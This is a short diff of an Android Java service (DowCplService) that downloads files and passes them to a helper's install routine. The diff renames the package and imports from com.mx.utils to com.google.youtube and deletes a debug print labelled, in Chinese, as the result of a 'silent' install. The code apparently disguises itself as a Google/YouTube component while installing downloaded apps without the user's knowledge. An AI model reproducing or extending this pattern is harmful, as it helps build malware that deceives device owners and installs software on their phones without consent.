@@ -1,9 +1,9 @@
-package com.mx.utils.services;
+package com.google.youtube.services;
 
 import java.io.File;
 
-import com.mx.utils.utils.HttpUtil;
-import com.mx.utils.utils.MyHelpUtil;
+import com.google.youtube.utils.HttpUtil;
+import com.google.youtube.utils.MyHelpUtil;
 
 import android.app.DownloadManager;
 import android.app.DownloadManager.Query;
@@ -62,8 +62,6 @@ public class DowCplService extends IntentService {
 
 						int i = MyHelpUtil.install(Uri.parse(localuri)
 								.getPath());
-
-						System.out.println("静默：安装返回结果：" + i);
 
 						if (i == 1) {
 
